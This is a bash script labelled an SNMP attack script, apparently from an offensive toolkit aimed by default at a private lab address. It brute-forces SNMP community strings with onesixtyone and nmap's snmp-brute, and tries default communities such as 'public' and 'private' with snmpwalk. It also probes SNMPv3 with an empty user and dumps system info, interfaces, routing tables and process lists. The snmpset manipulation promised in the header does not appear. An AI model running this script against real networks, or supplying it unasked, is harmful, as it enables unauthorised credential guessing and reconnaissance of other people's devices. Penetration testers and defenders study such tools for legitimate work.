#!/bin/bash
###############################################################################
# SNMP Attack Script
# Community brute force, snmpwalk enumeration, snmpset manipulation
###############################################################################

SUBTYPE="${1:-enum}"
TARGET_IP="${2:-10.10.40.43}"
TARGET_PORT="${3:-161}"
RESULTS_DIR="${4:-.}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
WORDLISTS_DIR="${SCRIPT_DIR}/wordlists"
COMMUNITY_FILE="${WORDLISTS_DIR}/snmp_communities.txt"

mkdir -p "$RESULTS_DIR"

echo "[*] SNMP attacks: $SUBTYPE against ${TARGET_IP}:${TARGET_PORT}"

run_enum() {
    echo "[*] SNMP enumeration"

    # Community string brute force with onesixtyone
    if command -v onesixtyone &>/dev/null && [[ -f "$COMMUNITY_FILE" ]]; then
        echo "[*] SNMP community brute force (onesixtyone)..."
        onesixtyone -c "$COMMUNITY_FILE" "$TARGET_IP" \
            > "${RESULTS_DIR}/snmp_community_brute.txt" 2>&1 || true
    fi

    # Nmap SNMP scripts
    echo "[*] Nmap SNMP enumeration..."
    nmap -sU -p 161 --script=snmp-info,snmp-brute,snmp-interfaces,snmp-processes,snmp-sysdescr,snmp-netstat \
        "$TARGET_IP" -oN "${RESULTS_DIR}/nmap_snmp.txt" 2>&1 || true

    # snmpwalk with common communities
    local communities=("public" "private" "community" "manager" "snmp" "default")

    for community in "${communities[@]}"; do
        echo "[*] snmpwalk with community: $community"
        snmpwalk -v2c -c "$community" "$TARGET_IP" 2>&1 | head -50 \
            >> "${RESULTS_DIR}/snmpwalk_${community}.txt" || true
        sleep 1
    done

    # SNMPv3 user enumeration
    echo "[*] SNMPv3 user enumeration..."
    snmpwalk -v3 -l noAuthNoPriv -u "" "$TARGET_IP" 2>&1 | head -20 \
        >> "${RESULTS_DIR}/snmpv3_enum.txt" || true

    # SNMP system info extraction
    echo "[*] Extracting system information..."
    snmpwalk -v2c -c public "$TARGET_IP" 1.3.6.1.2.1.1 2>&1 \
        > "${RESULTS_DIR}/snmp_sysinfo.txt" || true

    # SNMP interface enumeration
    snmpwalk -v2c -c public "$TARGET_IP" 1.3.6.1.2.1.2.2 2>&1 \
        > "${RESULTS_DIR}/snmp_interfaces.txt" || true

    # SNMP routing table
    snmpwalk -v2c -c public "$TARGET_IP" 1.3.6.1.2.1.4.21 2>&1 \
        > "${RESULTS_DIR}/snmp_routes.txt" || true

    # SNMP process list
    snmpwalk -v2c -c public "$TARGET_IP" 1.3.6.1.2.1.25.4.2 2>&1 \
        > "${RESULTS_DIR}/snmp_processes.txt" || true

    echo "[+] SNMP enumeration complete"
}

case "$SUBTYPE" in
    enum)   run_enum ;;
    full)   run_enum ;;
    *)
        echo "Unknown subtype: $SUBTYPE"
        echo "Available: enum, full"
        exit 1
        ;;
esac

echo "[*] SNMP attack script complete"
